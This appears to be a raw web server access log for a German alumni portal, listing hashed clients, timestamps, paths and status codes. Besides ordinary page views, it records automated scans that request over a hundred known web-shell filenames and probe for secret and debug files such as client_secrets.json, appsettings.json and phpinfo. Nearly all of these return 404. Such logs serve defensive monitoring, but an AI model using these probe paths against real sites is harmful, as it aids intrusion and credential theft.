8e9d20dc293bb8d0cca18d994660d8d8b251a752b6422ebcb26713ee9e8148ea;2025-11-04 17:41:54;;/bge.php;GET;404
8e9d20dc293bb8d0cca18d994660d8d8b251a752b6422ebcb26713ee9e8148ea;2025-11-04 17:41:54;;/ifm.php;GET;404
8e9d20dc293bb8d0cca18d994660d8d8b251a752b6422ebcb26713ee9e8148ea;2025-11-04 17:41:54;;/thxt.php;GET;404
8e9d20dc293bb8d0cca18d994660d8d8b251a752b6422ebcb26713ee9e8148ea;2025-11-04 17:41:54;;/kairolin.php;GET;404
8e9d20dc293bb8d0cca18d994660d8d8b251a752b6422ebcb26713ee9e8148ea;2025-11-04 17:41:55;;/siln.php;GET;404
8e9d20dc293bb8d0cca18d994660d8d8b251a752b6422ebcb26713ee9e8148ea;2025-11-04 17:41:55;;/18299.php;GET;404
b8a47d7b148e97a78216f695b162fb9f189064cce3159b203fee06a6e7e8a670;2025-11-04 17:44:11;;/personen/alumni/schule/09A05;GET;200
fac47d385b2c810aca508af8d91934a2fddf2264f67d5f841b186bc0eaf0860e;2025-11-04 17:46:05;;/sitemap.xml;GET;200
fac47d385b2c810aca508af8d91934a2fddf2264f67d5f841b186bc0eaf0860e;2025-11-04 17:46:09;;/;GET;200
fac47d385b2c810aca508af8d91934a2fddf2264f67d5f841b186bc0eaf0860e;2025-11-04 17:46:12;;/sitemap.xml;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-04 17:46:56;;/gruppen/hobby/fotografie;GET;200
040c8feffb73266f67a63ea812aff74367369b6a87d2cdd8ab0bb97fa81236cf;2025-11-04 17:56:20;;/aktuelles/meldungen?category=wissenschaft;GET;200
3d8aa4f4529ff118c1823990eb82d4c74730f72cd1bf22f29ebcf90e0eae186a;2025-11-04 18:00:10;;/;GET;200
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-04 18:03:01;;/app_dev.php/_profiler/phpinfo;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-04 18:03:03;;/?phpinfo=-1;GET;200
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-04 18:03:05;;/client_secrets.json;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-04 18:03:06;;/pinfo.php;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-04 18:03:11;;/web/debug/default/view;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-04 18:03:15;;/appsettings.json;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-04 18:03:17;;/api/test;GET;404
3b30e19122fc1612d6b9b78dd16f7fe90db8e15423644c72ffa63989557fd63a;2025-11-04 18:04:52;;/personen/alumni/schule/5503;GET;200
3f01de09f2f3ba8e6ebd822af6a132b35e40ccd035d317fbc52e2823dabba305;2025-11-04 18:09:52;;/;GET;200
235d05b781fa35b8e343c3a25ed05d0e53513908231e0bab8b5632fd8555ac23;2025-11-04 18:09:59;;/personen;GET;200
5d5db6553888528ae907019a1d944ae8fdc1fb8fcdf9e2c23096fed08b87a576;2025-11-04 18:13:22;;/personen/alumni/schule/5508;GET;200
43890574a9acee27bf83953c61466f70f76bbc011ceba8572fe341a5cf1bd207;2025-11-04 18:19:27;;/;GET;200
7adcccc27b71ecbc151048621fa74433f5d723fb668d7a540636433d925ff496;2025-11-04 18:20:17;;/personen/alumni/schule/4440541;GET;200
b1085f21480f21f14c38fc3ab633fd3694e805ade252df64d15ec5e1a985dca7;2025-11-04 18:21:20;;/;GET;200
540edf87e7bbd9ffce1f294e565e72af3dc8b2ccbc82333104527eb0dcc7b180;2025-11-04 18:27:14;;/personen/alumni/schule/170690;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-04 18:29:45;/gruppen/hobby/programmieren;/personen/alumni/schule/68470;GET;200
57b5fe8722b7f105bc98343d399c040a7bfbc9e68edf3d0b87a4cc0ab71d0df4;2025-11-04 18:34:32;;/personen/alumni/schule/5501;GET;200
d79b432f61192bed40d96871d6ff3d75f0e405d76db0381eb7675ce19502e8c3;2025-11-04 18:41:48;;/personen/alumni/schule/5506;GET;200
027c655f4a66038183ef348e13ed2d79c36249e09827c80765c96d81d9ec9c3f;2025-11-04 18:45:20;;/;GET;200
027c655f4a66038183ef348e13ed2d79c36249e09827c80765c96d81d9ec9c3f;2025-11-04 18:45:24;;/info.php;GET;404
027c655f4a66038183ef348e13ed2d79c36249e09827c80765c96d81d9ec9c3f;2025-11-04 18:45:25;;/server-status;GET;404
027c655f4a66038183ef348e13ed2d79c36249e09827c80765c96d81d9ec9c3f;2025-11-04 18:45:25;;/config.json;GET;404
027c655f4a66038183ef348e13ed2d79c36249e09827c80765c96d81d9ec9c3f;2025-11-04 18:45:26;;/telescope/requests;GET;404
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-04 18:47:13;;/;GET;200
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-04 18:47:14;/;/;GET;200
ab762a040f8f879603b133a48fa9cd6a9d1393f8e6ca4e9a9cbe21c65545e755;2025-11-04 18:48:58;;/personen/alumni/schule/5514;GET;200
eaa7fad7039328bfbfe0199bb71ae6460e1207c3347c4aa610ab7878eff89f82;2025-11-04 18:55:34;;/personen/alumni/schule/4240016;GET;200
a7ddb8e6a252de98289865a55a8381e08625d9b8ba4a891fb511e7d101fc4289;2025-11-04 18:56:18;;/docs/img/skGraph.png;GET;404
1ba060fce115a1d8210c7118dedbdde3248b2e5aac862755d57fdf4deaaa3638;2025-11-04 19:02:46;;/personen/alumni/schule/5502;GET;200
6dc8977ac7973771e7252359c7887acb5db80f6241965c8bd16e2c2c46592403;2025-11-04 19:05:18;;/themen/details/der-start-ins-studium;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-04 19:07:48;/personen/all/3;/personen/all/2;GET;200
9220a0f306fafee907ae21cbaa3dc18ee1f84e2f1890016e1ea9feaeb336135e;2025-11-04 19:10:03;;/personen/alumni/schule/0351;GET;200
cd64b48e213c364ba8bbf1f9ea620f18cb8d8579c28601fd382fb1796b77b3dc;2025-11-04 19:13:14;;/;GET;200
9969942b193c056f4f60800de4368c53a0eba87e18be0cb2f3d9dfc25d93950a;2025-11-04 19:17:54;;/personen/alumni/schule/59026;GET;200
71f331bda3ff5a1b1880b5ed375ee4aaa4463d7945558b9cb3608207a62c0b22;2025-11-04 19:22:48;;/;GET;200
4d081451961367b45ff361d3248fcc93dd1a49d77e73304e864ee26db6b1b4b9;2025-11-04 19:26:30;;/personen/alumni/schule/190962;GET;200
8b5b6020763279fe2dea40821ef58a65ab1bb67b4f995f19071abaf07d4fbb6c;2025-11-04 19:33:09;;/;GET;200
335297df76fc127f749da478514d8601f00aa1076254f88eb0d885bd2e970a5d;2025-11-04 19:33:32;;/sitemap.txt;GET;404
f4b9fcb910b0b8d65a54672efb42c66700ad45fdc12f901920f4b2bf10ecd714;2025-11-04 19:36:00;;/personen/alumni/schule/09A05;GET;200
dbf81d61e5ef70d0ecc023d14e7f10afa34bac8543bff34aecbcb77fc06a3c66;2025-11-04 19:39:25;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
c3e2c5635a31f06a40a8d6ef66d84d4e2d0b992ba2bc9665facc2f5deeb0efbb;2025-11-04 19:40:45;;/mah.php;GET;404
c3e2c5635a31f06a40a8d6ef66d84d4e2d0b992ba2bc9665facc2f5deeb0efbb;2025-11-04 19:40:45;;/chosen.php;GET;404
c3e2c5635a31f06a40a8d6ef66d84d4e2d0b992ba2bc9665facc2f5deeb0efbb;2025-11-04 19:40:45;;/goods.php;GET;404
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-04 19:43:40;/gruppen/hobby/programmieren;/personen/alumni/schule/MP004;GET;200
17afa17e96977fad86403723cc6a7a39ffd505b781ddb8c2a690a59a2937c079;2025-11-04 19:47:20;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
dcdd7c096fca6b012b16121f90a99ec95e9c5adeab3253b0af81056809bdcd11;2025-11-04 19:49:33;;/aktuelles/meldungen?category=wissenschaft;GET;200
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:09;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:10;;/031.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:11;;/ilex.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:11;;/flex.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:12;;/222.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:12;;/444.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:13;;/file9.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:13;;/filesss.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:14;;/file88.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:15;;/gifclass4.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:15;;/555.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:16;;/333.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:16;;/hly.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:17;;/d12.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:17;;/2clas.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:18;;/bless5.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:18;;/file15.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:19;;/hk.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:20;;/alpa.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:20;;/file21.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:21;;/ssss.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:21;;/ut.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:22;;/inde.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:22;;/classgoto24.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:23;;/030.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:23;;/thh.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:24;;/indo.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:25;;/fileas.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:25;;/yellow.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:26;;/33.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:26;;/plss3.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:27;;/he.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:27;;/thxt.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:28;;/wfile.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:28;;/class20.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:29;;/1.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:29;;/usep.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:30;;/wa.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:30;;/wb.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:31;;/file1.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:32;;/2.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:32;;/a2.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:33;;/a.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:33;;/gmo.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:34;;/info.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:34;;/file2.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:35;;/lv.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:35;;/about.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:36;;/abcd.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:36;;/lock360.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:37;;/alfa.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:38;;/NewFile.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:38;;/atomlib.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:39;;/--.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:39;;/system_log.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:40;;/pp.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:40;;/geck.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:41;;/gm.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:42;;/makeasmtp.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:42;;/file4.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:43;;/lala.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:43;;/admin.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:44;;/7.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:44;;/file18.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:45;;/ffile.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:46;;/file7.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:46;;/we.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:47;;/gfile.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:47;;/jlex3.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:48;;/des.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:49;;/aaa.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:49;;/gifclass.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:50;;/vee.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:51;;/efile.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:51;;/afile.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:52;;/errorfile.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:53;;/f35.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:53;;/gool.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:54;;/haikh.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:54;;/135.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:55;;/enclas.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:56;;/ioxi-o.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:56;;/wp-admin/js/wp-conflg.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:57;;/classwithtostring.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:57;;/image.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:58;;/wp-admin/wp-conflg.php?p=;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:58;;/mail.php?;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:51:59;;/sx.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:00;;/max.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:00;;/size.php?p=;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:01;;/mpxct.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:01;;/0xx.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:02;;/s.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:03;;/hq.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:03;;/blox.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:04;;/ant.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:04;;/fso.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:05;;/htaccess.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:05;;/wp-trackback.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:06;;/wp-admin/about.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:06;;/readme.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:07;;/v.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:08;;/sck.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:08;;/X7x.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:09;;/xpass.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:10;;/bless.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:10;;/bless2.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:11;;/bless6.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:11;;/bless10.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:12;;/bless11.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:12;;/wp-admin/js/index.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:13;;/thoms.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:14;;/xsas.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:14;;/xrp.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:15;;/wp-freya.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:15;;/css/index.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:16;;/file30.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:17;;/fesa.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:17;;/class-.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:18;;/.well-known/gecko-litespeed.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:19;;/up.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:19;;/403.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:20;;/9v6.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:20;;/lte7.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:21;;/1vbqo.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:21;;/l10n.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:22;;/tajj.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:23;;/fdd2.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:23;;/class9.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:24;;/sto.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:24;;/7h.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:25;;/fh26.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:25;;/ixj.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:26;;/x23.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:26;;/zeu.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:27;;/f2r4.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:28;;/lopst.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:28;;/gecko.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:29;;/0xs.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:29;;/Zeiss.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:30;;/x0x.php;GET;404
34399983184dd82f8a2cd3c33a16251356024124bec0ef742ee979cb22243c0b;2025-11-04 19:52:30;;/adin.php;GET;404
393c24d2fa29276af0b0124fdcf58d0d60c4376efb90b5dfa7317e6d4c7f2822;2025-11-04 19:53:54;;/sites/all/libraries/elfinder/src/connectors/php/connector.php;GET;404
b8c68a275cb2e7397dee7cfc179374d26b292e4cc1721e988dd14998cfe65abe;2025-11-04 19:54:15;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
cb426ddaf25ed39999e8cd20ba230e6ba4514afb8767cf80329d80ade9c144ad;2025-11-04 19:54:28;;/aktuelles/stellenangebote;GET;200
c33a79041eedf1c4fd61bce79ec85023e1fbb410bff8267cb73b51e7737612ef;2025-11-04 19:54:36;;/themen/details/abschied-aus-moabit;GET;200
153e34497b5d8e65da9577755a57cc045534c18e8e387af1df970be4bc9bc7dd;2025-11-04 19:55:59;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
8b0aa8d2ade5f2588681212fc609f947f17975a2f2064dc3600c5d4619055684;2025-11-04 19:56:38;;/;GET;200
bee237ab6bda7816a62bd49276d9bf413e6a6a733d947a1bd4f6c5ab64fab1df;2025-11-04 19:59:16;;/personen/alumni/schule/5503;GET;200
c8e282c7136ca1d1163fa6120a3bade2dc67c9a9b581965bfef26b3aaedd7db4;2025-11-04 20:03:40;;/themen/details/hackerangriff-lauft-ins-leere;GET;200
49c7bdf5ee890fa7c3251ae5609ac117699dc50b030877ca23f6b516d0ddb522;2025-11-04 20:08:10;;/personen/alumni/schule/5508;GET;200
accd5e2bd9206f3f1ac5d4dd4222cd845ef036f594a6cea57e57f9da0266c3d5;2025-11-04 20:13:03;;/aktuelles/meldungen?category=wissenschaft;GET;200
00196720ae4c9f5e2a292173e5a890abf76f7c4613890d11d5d59c8259e1a228;2025-11-04 20:16:31;;/personen/alumni/schule/4340014;GET;200
094939c7719a27c29c2962f0d1e3c4bfc8f018ef1720f8b630feb5b2ad7dd40b;2025-11-04 20:23:49;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
0f5cedcefa4c1592f8840f57df4bcedf7eb062f44b4f9783d20a1e9caf039e92;2025-11-04 20:24:00;;/sitemap.txt;GET;404
edf7e5d32cd73e53fd11a4c6cf395097f0da79f5ebc5819da1fc292ef531f676;2025-11-04 20:24:47;;/personen/alumni/schule/59000;GET;200
a5fc40d608aaa14f185a9ec680ed59de16b813f4e2ee5315de1c24b241102a24;2025-11-04 20:26:13;;/.github-ci.yml;GET;404
a5fc40d608aaa14f185a9ec680ed59de16b813f4e2ee5315de1c24b241102a24;2025-11-04 20:26:14;;/.gitlab-ci.yml;GET;404
5f8dca8d45b99c885c2e50840eaa0b10d80a3e7664579b5495c31b6f8b7bc9ab;2025-11-04 20:31:45;;/docs/img/flowchart_01.png;GET;404
75ad9bfc6641fdf0832d3a2c938aae350394fbf5c6451dc7beb789b62663d3a9;2025-11-04 20:32:53;;/personen/alumni/schule/65262;GET;200
